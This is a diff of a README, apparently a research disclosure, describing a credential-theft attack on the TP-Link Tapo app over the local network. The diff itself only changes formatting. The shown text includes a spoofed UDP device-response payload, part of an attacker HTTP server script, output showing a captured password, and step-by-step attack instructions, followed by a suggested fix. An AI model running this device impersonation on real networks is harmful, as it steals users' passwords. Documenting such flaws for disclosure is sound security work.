@@ -9,8 +9,8 @@ Bypassing the authentication mechanism of the TP-Link Tapo app to obtain the vic
 
 ## Conditions of the attack
 1.	The attacker is in the same network of the Tapo app (reachable through UDP broadcast)
-and one of the following two: \\
-2a. The attacker knows the username (email address) of the victim in the Tapo app OR \\
+and one of the following two: <br>
+2a. The attacker knows the username (email address) of the victim in the Tapo app OR <br>
 2b. A TP-Link device is present in the network of the attacker and the Tapo app
 
 ## APP version
@@ -67,7 +67,7 @@ bufferSize = 1024
 In this script, we simulated the response of a TP-Link Tapo Smart Plug P110 (but it works without the presence of any device in the network).
 The UDP response includes the following JSON:
 
-```json
+```
 udpJSONPayload={"result":{"device_id":"6447b7fc4902ab3a83f973a2767a38aa","owner":OWNER,"device_type":"SMART.TAPOPLUG","device_model":"P110(EU)","ip":attackerIP,"mac":"30-DE-4B-45-12-60","is_support_iot_cloud":False,"obd_src":"tplink","factory_default":False,"mgt_encrypt_schm":{"is_support_https":False,"encrypt_type":"AES","http_port":80,"lv":1}},"error_code":0}
 ```
 
@@ -83,15 +83,18 @@ def run():
      server_address = (attackerIP, 80)
      httpd = HTTPServer(server_address, RequestHandlerHTTP)
      httpd.serve_forever()
+```
 The final result, reporting the victim’s password, is shown below:
+
+```
 10.0.0.113 - - [22/May/2023 10:26:16] "POST /app HTTP/1.1" 200 -
 stolenpassword=Vincenzo&Sara
 ```
 
 ## Summary of the attack
-1. Lunch either OWNERFromMD5.py or OWNERFromDevice.py to obtain the OWNER parameter. \\
-2. Lunch HTTPHandshakeImpersonation.py and UDPImpersonation.py (lunch a HTTP and UDP server simultaneously) \\
-3. Wait for the user to open the home of the Tapo App and obtain the password in the console of HTTPHandshakeImpersonation.py . \\
+1. Lunch either OWNERFromMD5.py or OWNERFromDevice.py to obtain the OWNER parameter. 
+2. Lunch HTTPHandshakeImpersonation.py and UDPImpersonation.py (lunch a HTTP and UDP server simultaneously) 
+3. Wait for the user to open the home of the Tapo App and obtain the password in the console of HTTPHandshakeImpersonation.py . 
 
 ## Observations
 This attack is not a vulnerability of a specific device (it can be conducted even in the case no device is present in the network) but it concerns the authentication protocol the Tapo App uses. To solve the problem, we suggest removing the use of local traffic and relying on the cloud through TLS messages.
